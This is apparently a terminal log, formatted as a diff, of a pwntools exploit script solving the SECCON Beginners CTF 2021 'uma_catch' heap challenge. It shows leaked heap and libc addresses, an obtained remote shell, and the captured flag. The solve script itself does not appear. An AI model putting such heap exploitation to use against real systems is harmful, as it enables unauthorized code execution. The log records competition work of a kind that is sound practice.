@@ -1,0 +1,28 @@
+mito@ubuntu:~/CTF/SECCON_Beginners_CTF_2021/Pwn_uma_catch/uma_catch$ python solve.py r
+[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_uma_catch/uma_catch/chall'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to uma-catch.quals.beginners.seccon.jp on port 4101: Done
+[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_uma_catch/uma_catch/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+heap_leak = 0x55e189f3d2f0
+heap_base = 0x55e189f3d000
+libc_leak = 0x7f99ec47eca0
+libc_base = 0x7f99ec093000
+[*] Switching to interactive mode
+$ id
+uid=999(pwn) gid=999(pwn) groups=999(pwn)
+$ ls -l
+total 28
+-r-xr-x--- 1 root pwn 17800 May 21 03:18 chall
+-r--r----- 1 root pwn    43 May 21 03:18 flag.txt
+-r-xr-x--- 1 root pwn    34 May 21 03:18 redir.sh
+$ cat flag.txt
+ctf4b{h34p_15_4ls0_m3m0ry_ju5t_l1k3_st4ck}
